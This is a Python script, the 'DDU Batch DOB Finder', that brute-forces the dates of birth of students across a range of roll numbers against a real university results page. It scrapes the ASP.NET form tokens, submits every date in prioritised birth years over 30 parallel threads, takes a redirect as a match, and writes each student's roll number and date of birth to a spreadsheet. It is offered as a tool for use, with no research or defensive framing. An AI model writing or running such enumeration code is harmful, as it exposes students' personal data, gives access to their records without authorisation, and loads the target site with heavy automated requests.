import requests
from datetime import datetime, timedelta
import time
import re
import pandas as pd
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
from tqdm import tqdm

# Retry wrapper
def safe_request(method, *args, **kwargs):
    for attempt in range(3):
        try:
            return method(*args, **kwargs)
        except requests.exceptions.RequestException:
            time.sleep(random.uniform(0.5, 1.5))
    return None

def try_date(session, roll_no, semester, date_of_birth):
    url = "https://ddugorakhpur.com/result2023/searchresult_new.aspx"

    try:
        initial_response = safe_request(session.get, url, timeout=10)
        if not initial_response:
            return False
        
        viewstate = re.search(r'id="__VIEWSTATE" value="([^"]+)"', initial_response.text)
        eventvalidation = re.search(r'id="__EVENTVALIDATION" value="([^"]+)"', initial_response.text)
        viewstategenerator = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]+)"', initial_response.text)

        if not (viewstate and eventvalidation and viewstategenerator):
            return False

        form_data = {
            "__VIEWSTATE": viewstate.group(1),
            "__VIEWSTATEGENERATOR": viewstategenerator.group(1),
            "__EVENTVALIDATION": eventvalidation.group(1),
            "ddlsem": semester,
            "txtRollno": roll_no,
            "txtDob": date_of_birth,
            "btnSearch": "Search Result"
        }

        response = safe_request(session.post, url, data=form_data, allow_redirects=False, timeout=10)
        if response and response.status_code == 302:
            return True

    except Exception:
        pass

    return False

def generate_dates(year):
    dates = []
    start_date = datetime(year, 1, 1)
    end_date = datetime(year, 12, 31)
    current = start_date
    while current <= end_date:
        dates.append(current.strftime('%Y-%m-%d'))
        current += timedelta(days=1)
    return dates

def smart_runner(dates, roll_no, semester, max_workers=30):
    session = requests.Session()

    found_date = None

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_date = {executor.submit(try_date, session, roll_no, semester, date): date for date in dates}
        
        for future in as_completed(future_to_date):
            date = future_to_date[future]
            try:
                result = future.result()
                if result:
                    found_date = date
                    executor.shutdown(wait=False, cancel_futures=True)
                    return found_date
            except Exception:
                pass

            time.sleep(random.uniform(0.05, 0.2))

    return found_date

def grouped_search(roll_no, semester):
    priority_groups = [
        [2006, 2007, 2008],
        [2003, 2004, 2005],
        [2000, 2001, 2002, 2009, 2010]
    ]

    for years in priority_groups:
        dates = []
        for year in years:
            dates.extend(generate_dates(year))
        
        found = smart_runner(dates, roll_no, semester)
        if found:
            return found

    return None

def batch_search(start_roll, end_roll, semester):
    results = []

    roll_numbers = range(start_roll, end_roll + 1)
    for roll_no in tqdm(roll_numbers, desc="Processing Roll Numbers", ncols=80):
        found_dob = grouped_search(str(roll_no), semester)
        if found_dob:
            results.append({"Roll No": roll_no, "DOB": found_dob})
        else:
            results.append({"Roll No": roll_no, "DOB": "N.A"})

    return results

def save_to_excel(data, filename="dob_results.xlsx"):
    df = pd.DataFrame(data)
    df.to_excel(filename, index=False)
    print(f"\n✅ Results saved to {filename}")

def main():
    print("📄 DDU Batch DOB Finder (Save to Excel)")
    print("--------------------------------------")

    start_roll = int(input("Enter Starting Roll Number: ").strip())
    end_roll = int(input("Enter Ending Roll Number: ").strip())
    semester = input("Enter Semester (1-8): ").strip()

    results = batch_search(start_roll, end_roll, semester)
    save_to_excel(results)

if __name__ == "__main__":
    main()
